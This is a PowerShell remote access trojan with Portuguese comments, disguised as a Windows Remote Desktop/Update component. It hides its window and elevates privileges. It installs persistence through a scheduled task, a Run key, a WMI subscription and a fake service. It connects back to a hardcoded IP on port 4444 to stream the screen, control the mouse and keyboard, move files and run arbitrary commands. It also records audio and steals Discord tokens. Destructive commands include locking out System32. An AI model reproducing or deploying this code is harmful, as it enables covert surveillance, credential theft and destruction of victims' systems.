<#
.SYNOPSIS
Windows Critical System Component - Remote Desktop Integration
.DESCRIPTION
Microsoft Windows Remote Desktop Module - Complete Control
.NOTES
Version: 10.0.19045.1
#>

# ===== CONFIGURAÇÕES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4444
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"

# ===== MUTEX - EVITA MÚLTIPLAS INSTÂNCIAS =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== ELEVAR PRIVILÉGIOS =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb RunAs -ArgumentList $arguments
    exit
}

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== FUNÇÕES DE CONTROLE DE TELA =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Captura de tela
function Get-ScreenCapture {
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    
    $ms = New-Object System.IO.MemoryStream
    $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $graphics.Dispose()
    $bitmap.Dispose()
    
    return [Convert]::ToBase64String($ms.ToArray())
}

# Streaming contínuo (live preview)
function Start-LiveStream {
    $jpegQuality = 50
    $encoder = [System.Drawing.Imaging.Encoder]::Quality
    $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
    $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($encoder, $jpegQuality)
    $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {$_.MimeType -eq 'image/jpeg'}
    
    while ($true) {
        try {
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
            
            $ms = New-Object System.IO.MemoryStream
            $bitmap.Save($ms, $jpegCodec, $encoderParams)
            
            $frame = [Convert]::ToBase64String($ms.ToArray())
            $writer.WriteLine("FRAME:$frame")
            
            $graphics.Dispose()
            $bitmap.Dispose()
            $ms.Dispose()
            
            Start-Sleep -Milliseconds 100 # 10 FPS
        } catch { break }
    }
}

# Controle de mouse
function Move-Mouse { 
    param($x, $y)
    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
}

function Click-Mouse {
    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
}

function RightClick-Mouse {
    [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
}

function DoubleClick-Mouse {
    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}{ENTER}")
}

# Controle de teclado
function Send-Key {
    param($key)
    [System.Windows.Forms.SendKeys]::SendWait($key)
}

function Send-Text {
    param($text)
    [System.Windows.Forms.SendKeys]::SendWait($text)
}

# Funções de arquivo
function Get-FileList {
    param($Path)
    Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
        [PSCustomObject]@{
            Name = $_.Name
            Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
            Size = if ($_.PSIsContainer) { "" } else { "{0:N0} KB" -f ($_.Length/1KB) }
            Modified = $_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
        }
    } | ConvertTo-Json -Compress
}

function Download-File {
    param($Path)
    if (Test-Path $Path) {
        $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
        return "FILE:$content"
    }
    return "FILE_NOT_FOUND"
}

function Upload-File {
    param($Path, $Content)
    $bytes = [Convert]::FromBase64String($Content)
    [IO.File]::WriteAllBytes($Path, $bytes)
    return "UPLOAD_OK"
}

function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        return $result
    } catch {
        return "Erro: $_"
    }
}

# Webcam
function Get-Webcam {
    try {
        $webcam = New-Object -ComObject WIA.ImageFile
        # Comando simplificado - em produção usar AForge.NET
        return "WEBCAM_NOT_IMPLEMENTED"
    } catch {
        return "WEBCAM_ERROR"
    }
}

# Áudio
function Get-Microphone {
    try {
        $recorder = New-Object -ComObject SoundRecorder
        $recorder.StartRecording()
        Start-Sleep -Seconds 10
        $recorder.StopRecording()
        $audio = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:TEMP\recording.wav"))
        return "AUDIO:$audio"
    } catch {
        return "AUDIO_ERROR"
    }
}

# Discord Token
function Get-DiscordToken {
    $tokens = @()
    $paths = @(
        "$env:APPDATA\discord\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            Get-ChildItem $path -ErrorAction SilentlyContinue | ForEach-Object {
                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                $matches = $regex.Matches($content)
                foreach ($match in $matches) {
                    $tokens += $match.Value
                }
            }
        }
    }
    
    $tokens = $tokens | Select-Object -Unique
    return "TOKENS:" + ($tokens -join "`n")
}

# Funções destrutivas
function Block-System32 {
    try {
        $path = "C:\Windows\System32"
        $acl = Get-Acl $path
        $acl.SetAccessRuleProtection($true, $false)
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
        $acl.AddAccessRule($accessRule)
        Set-Acl $path $acl
        return "SYSTEM32_BLOCKED"
    } catch {
        return "SYSTEM32_ERROR"
    }
}

function Black-Screen {
    try {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.BackColor = 'Black'
        $form.ShowDialog()
        return "BLACK_SCREEN"
    } catch {
        return "BLACK_SCREEN_ERROR"
    }
}

function Lock-Mouse {
    try {
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
            public class MouseTrap {
                [DllImport("user32.dll")]
                public static extern bool SetCursorPos(int x, int y);
                [DllImport("user32.dll")]
                public static extern bool ClipCursor(ref RECT lpRect);
                public struct RECT { public int left, top, right, bottom; }
                public static void Trap() {
                    RECT rect = new RECT();
                    rect.left = 0; rect.top = 0; rect.right = 1; rect.bottom = 1;
                    ClipCursor(ref rect);
                    while(true) { SetCursorPos(0, 0); }
                }
            }
"@
        [MouseTrap]::Trap()
        return "MOUSE_LOCKED"
    } catch {
        return "MOUSE_ERROR"
    }
}

function Power-Control {
    param($Action)
    switch ($Action) {
        "shutdown" { Stop-Computer -Force }
        "reboot" { Restart-Computer -Force }
    }
    return "POWER_$Action"
}

# ===== PERSISTÊNCIA MÁXIMA =====
function Install-MaximumPersistence {
    $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
    
    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
    
    # 1. Tarefa Agendada
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
    
    # 2. Registro
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
    
    # 3. WMI
    try {
        $filterArgs = @{ Name="$installName-Filter"; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'" }
        $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
        
        $consumerArgs = @{ Name="$installName-Consumer"; CommandLineTemplate="powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" }
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs
        
        $bindingArgs = @{ Filter=$filter; Consumer=$consumer }
        $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs
    } catch { }
    
    # 4. Serviço
    try { New-Service -Name $installName -BinaryPathName "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -DisplayName "Windows Update Service" -StartupType Automatic } catch { }
    
    # 5. Ocultar
    attrib +h +s +r $scriptPath
    
    return "PERSISTENCE_INSTALLED"
}

# ===== VERIFICAR INSTALAÇÃO =====
if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
    Install-MaximumPersistence
}

# ===== CONEXÃO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        # Identificação
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            
            switch -Wildcard ($cmd) {
                # ===== CONTROLE DE TELA =====
                "screenshot" { 
                    $writer.WriteLine("SCREEN:" + (Get-ScreenCapture))
                }
                "stream_start" {
                    Start-LiveStream
                }
                "stream_stop" {
                    # Streaming será interrompido ao desconectar
                }
                
                # ===== CONTROLE DE MOUSE =====
                "move *" { 
                    $pos = $cmd.Replace("move ","").Split(" ")
                    Move-Mouse $pos[0] $pos[1]
                    $writer.WriteLine("OK")
                }
                "click" { 
                    Click-Mouse
                    $writer.WriteLine("OK")
                }
                "rightclick" { 
                    RightClick-Mouse
                    $writer.WriteLine("OK")
                }
                "doubleclick" { 
                    DoubleClick-Mouse
                    $writer.WriteLine("OK")
                }
                
                # ===== CONTROLE DE TECLADO =====
                "key *" { 
                    $key = $cmd.Replace("key ","")
                    Send-Key $key
                    $writer.WriteLine("OK")
                }
                "type *" { 
                    $text = $cmd.Replace("type ","")
                    Send-Text $text
                    $writer.WriteLine("OK")
                }
                
                # ===== ARQUIVOS =====
                "ls *" { 
                    $path = $cmd.Replace("ls ","")
                    $writer.WriteLine(Get-FileList $path)
                }
                "download *" { 
                    $file = $cmd.Replace("download ","")
                    $writer.WriteLine(Download-File $file)
                }
                "upload *" { 
                    $data = $cmd.Replace("upload ","")
                    $parts = $data.Split("|")
                    Upload-File $parts[0] $parts[1]
                    $writer.WriteLine("OK")
                }
                "exec *" { 
                    $exe = $cmd.Replace("exec ","")
                    $writer.WriteLine(Execute-Command $exe)
                }
                
                # ===== PERIFÉRICOS =====
                "webcam" {
                    $writer.WriteLine(Get-Webcam)
                }
                "mic" {
                    $writer.WriteLine(Get-Microphone)
                }
                
                # ===== DADOS =====
                "discord" {
                    $writer.WriteLine(Get-DiscordToken)
                }
                
                # ===== DESTRUTIVAS =====
                "block_system32" {
                    $writer.WriteLine(Block-System32)
                }
                "black_screen" {
                    $writer.WriteLine(Black-Screen)
                }
                "lock_mouse" {
                    $writer.WriteLine(Lock-Mouse)
                }
                "shutdown" {
                    $writer.WriteLine(Power-Control "shutdown")
                }
                "reboot" {
                    $writer.WriteLine(Power-Control "reboot")
                }
                
                # ===== SAIR =====
                "exit" { 
                    break 
                }
                
                default { 
                    $writer.WriteLine("Comando não reconhecido: $cmd") 
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
